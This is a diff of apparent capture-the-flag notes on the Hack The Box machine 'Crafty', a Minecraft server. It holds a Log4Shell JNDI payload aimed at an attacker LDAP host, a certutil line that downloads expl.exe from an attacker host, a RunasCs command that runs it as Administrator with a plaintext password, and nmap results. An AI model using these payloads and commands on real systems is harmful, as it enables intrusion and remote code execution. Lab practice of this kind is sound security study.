@@ -5,11 +5,12 @@
 
 ${jndi:ldap://10.10.14.107:1389/a}
 
-certutil -urlcache -f http://10.10.14.107:4245/expl.exe c:\Users\svc_minecraft\server\logs\expl.exe
+upload file: certutil -urlcache -f http://10.10.14.107:4245/expl.exe c:\Users\svc_minecraft\server\logs\expl.exe
 
 
 .\RunasCs.exe Administrator s67u84zKq8IXw expl.exe
 
+```
 Nmap scan report for crafty.htb (10.10.11.249)
 Host is up (0.46s latency).
 Not shown: 65533 filtered tcp ports (no-response)
@@ -20,6 +21,10 @@ PORT      STATE SERVICE   VERSION
 |_  Potentially risky methods: TRACE
 25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100) ( CVE-2021–44228 )
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 527.64 seconds
+```
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 527.64 seconds
